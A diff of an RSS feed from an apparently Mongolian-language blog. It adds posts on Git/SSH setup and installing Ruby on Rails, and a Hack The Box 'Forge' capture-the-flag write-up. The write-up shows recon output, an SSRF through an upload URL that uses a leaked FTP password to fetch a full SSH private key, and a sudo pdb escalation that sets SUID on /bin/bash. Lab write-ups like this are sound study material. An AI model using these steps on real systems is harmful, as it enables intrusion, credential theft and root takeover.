+<p>Багаараа хамтран райлс тѳсѳл дээр ажиллаж байгаа тохиолдолд CI буюу Continuous Integration - ыг сайн шийдсэн байх хэрэгтэй болдог. Ажиллах процесс нь багын гишүүд бүр ѳѳрийн ѳѳрчлѳлтыг repository-д нэмэхээс ѳмнѳ райлс апплейкшнд шинээр хийсэн ѳѳрчлѳлт бүрд тест хийн шалгаад явах юм. Энгийнээр бол багаар ажиллаж байгаа үед алдаатай commit хийсэн тохиолдолд багын ажлыг тэр чигт нь холион бантанд нь хутгадаг, тэр асуудлыг шийдээд ѳгѳх, тѳслийн удирдагч ѳѳрѳѳ хувийн тохиргоо хийж ѳгсѳнѳѳр тѳслийг баллах гэсэн аюулаас нэг алхам холдож чадаж байгаа юм. </p>
+<h3 id="git">Git</h3>
+<p>Ѳѳрийн github аккоунттайгаа холбох хэрэгтэй. Аккоунт байхгүй бол <a href="https://github.com">Github</a> - орж бүртгүүлээрэй.</p>
+<p><code>YOUR NAME</code>, <code>YOUR@EMAIL.COM</code> оронд ѳѳрийн нэр, майл хаягаа бичнэ:</p>
+<pre><code>git config --global color.ui true
+git config --global user.name &quot;YOUR NAME&quot;
+git config --global user.email &quot;YOUR@EMAIL.com&quot;
+ssh-keygen -t rsa -C &quot;YOUR@EMAIL.com&quot;
+</code></pre>
+<h3 id="ssh">SSH</h3>
+<p>Шинээр үүссэн <code>SSH key</code> - ыг ѳѳрийн <code>github account</code> - д хуулж ѳгнѳ. Copy хийсэн бол SSH Key-ээ <a href="https://github.com/settings/ssh">энд</a> хуулна.</p>
+<pre><code>cat ~/.ssh/id_rsa.pub
+</code></pre>
+<h3 id="холболт-шалгах">Холболт шалгах</h3>
+<p>Хуулсан бол ажиллаж байгаа эсэхийг нь check хийж үзье:</p>
+<pre><code>ssh -T git@github.com
+</code></pre>
+<p>Ийм message гарч ирэх ёстой:</p>
+<pre><code>Hi excid3! You've successfully authenticated, but GitHub does not provide shell access.
+</code></pre>
+]]></content:encoded>
     </item>
     <item>
       <title>Ruby on Rails суулгах</title>
@@ -152,6 +1504,55 @@
       <pubDate>Sun, 03 Jan 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-01-03-ruby-on-rails-setup/</guid>
       <description>Ruby, Rails суулгах</description>
+      <content:encoded><![CDATA[<h3 id="руби-суулгах-223">Руби суулгах [2.2.3]</h3>
+<pre><code>sudo apt-get update
+sudo apt-get install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties libffi-dev
+</code></pre>
+<p>Эхллэд зарим шаардлагатай зүйлсийг суулгана.
+Ruby-г суулгах үндсэндээ 3 арга байдаг. Тус бүр ѳѳр ѳѳрийн гэсэн давуу талуудтай.</p>
+<ul>
+<li>rbenv</li>
+<li>rvm</li>
+<li>from source</li>
+</ul>
+<p>Хамгийн recommended арга нь rbenv, rvm хоёр юм. Энэ удаа <code>rbenv</code> аргаар ruby-г суулгана.
+Rbenv арга нь энгийн хоёр алхамтай. Эхлээд <code>rbenv</code>-гээ суулгаад дараа нь <code>ruby-build</code> - ээ суулгана:</p>
+<pre><code>cd
+git clone git://github.com/sstephenson/rbenv.git .rbenv
+echo 'export PATH=&quot;$HOME/.rbenv/bin:$PATH&quot;' &gt;&gt; ~/.bashrc
+echo 'eval &quot;$(rbenv init -)&quot;' &gt;&gt; ~/.bashrc
+exec $SHELL
+
+git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
+echo 'export PATH=&quot;$HOME/.rbenv/plugins/ruby-build/bin:$PATH&quot;' &gt;&gt; ~/.bashrc
+exec $SHELL
+
+git clone https://github.com/sstephenson/rbenv-gem-rehash.git ~/.rbenv/plugins/rbenv-gem-rehash
+
+rbenv install 2.2.3
+rbenv global 2.2.3
+ruby -v
+</code></pre>
+<p>Rubygems - ыг илүү дутуу documentation-гүйгээр суулгана:</p>
+<pre><code>echo &quot;gem: --no-ri --no-rdoc&quot; &gt; ~/.gemrc
+gem install bundler
+</code></pre>
+<h3 id="rails-суулгах-424">Rails суулгах [4.2.4]</h3>
+<p>Rails суулгахын ѳмнѳ <code>NodeJS</code> суулгана:</p>
+<pre><code>curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -
+sudo apt-get install -y nodejs
+</code></pre>
+<p>Rails суулгая:</p>
+<pre><code>gem install rails -v 4.2.4
+</code></pre>
+<p>Rails суусан эсэхийг шалгах:</p>
+<pre><code>rbenv rehash
+</code></pre>
+<p>Rails -v коммандыг ашиглан яг бүрэн суусан эсэхийг шалгая:</p>
+<pre><code>rails -v
+# Rails 4.2.4
+</code></pre>
+]]></content:encoded>
     </item>
     <item>
       <title>HTB - Forge</title>
@@ -159,6 +1560,147 @@
       <pubDate>Tue, 20 Feb 2024 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2024-02-20-htb-forge-writeup/</guid>
       <description>HTB - Forge - Writeup</description>
+      <content:encoded><![CDATA[<h3 id="1-ip-address">1. IP Address</h3>
+<pre tabindex="0"><code># Machine Address
+10.10.11.111
+
+# Local Address
+10.10.14.12
+</code></pre><h3 id="2-nmap">2. Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV -oA nmap/forge 10.10.11.111
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-10-30 22:18 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> forge.htb <span style="color:#f92672">(</span>10.10.11.111<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.22s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE    SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp filtered ftp
+</span></span><span style="display:flex;"><span>22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open     http    Apache httpd 2.4.41
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Gallery
+</span></span><span style="display:flex;"><span>Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.36 seconds
+</span></span></code></pre></div><p><code>Bionic -&gt; 4ubuntu0.3</code></p>
+<h3 id="3-gobuster">3. Gobuster</h3>
+<p>Хэрэгтэй path байгаагүй:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 224<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://forge.htb/uploads/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/upload               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 929<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/static               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 307<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://forge.htb/static/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2050<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 274<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h3 id="4-ffuf">4. ffuf</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /opt/SecLists/Discovery/DNS/shubs-subdomains.txt -u http://forge.htb/ -H <span style="color:#e6db74">&#34;Host: FUZZ.forge.htb&#34;</span> -t <span style="color:#ae81ff">200</span> -fl <span style="color:#ae81ff">10</span>
+</span></span></code></pre></div><p>admin.forge.htb:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Only localhost is allowed! 
+</span></span></code></pre></div><h3 id="5-url-upload">5. URL Upload</h3>
+<p><a href="http://forge.htb/uploads/Mx21C8lAyzi9AyygJDeW">http://forge.htb/uploads/Mx21C8lAyzi9AyygJDeW</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Admin Portal&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">nav</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;Portal home&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right margin-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/announcements&#34;</span>&gt;Announcements&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/upload&#34;</span>&gt;Upload image&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">nav</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">h1</span>&gt;Welcome Admins!&lt;/<span style="color:#f92672">h1</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span></code></pre></div><p>http://ADMIN.FORGE.HTB/announcements</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Announcements&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/main.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/announcements.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">nav</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;Portal home&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right margin-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/announcements&#34;</span>&gt;Announcements&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/upload&#34;</span>&gt;Upload image&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">nav</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">header</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span>&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span>&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">li</span>&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;lt;url&amp;gt;.&lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">ul</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><code>user</code>:<code>heightofsecurity123!</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://aDmin.forGe.hTb/upload?u<span style="color:#f92672">=</span>ftp://user:heightofsecurity123!@FORGE.HTB
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>         <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">04</span> 19:23 snap
+</span></span><span style="display:flex;"><span>-rw-r-----    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">1000</span>           <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">30</span> 18:02 user.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://aDmin.forGe.hTb/upload?u<span style="color:#f92672">=</span>ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa
+</span></span></code></pre></div><p>id_rsa:</p>
+<pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
+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
+shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><p>User:</p>
+<pre tabindex="0"><code>16eeaf74*************
+</code></pre><h3 id="6-enumeration">6. Enumeration</h3>
+<p><code>sudo -l</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User user may run the following commands on forge:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+</span></span></code></pre></div><p><code>remote-manage.py</code> - ашиглах боломжтой. Порт listen хийж байгаад <code>&lt;pdb&gt;</code> руу орохын тулд шинэ терминал сешн нээгээд ssh дахин нэвтрээд <code>nc localhost &lt;port&gt;</code> listen хийнэ. Эхний терминал сешн дээрээс <code>pdb</code> руу юу ч хамаагүй бичээд орно.</p>
+<h3 id="7-exploitation">7. Exploitation</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>os.system <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;chmod u+s /bin/bash&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><p>Root руу орохдоо:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -p
+</span></span></code></pre></div>]]></content:encoded>
     </item>
   </channel>
 </rss>
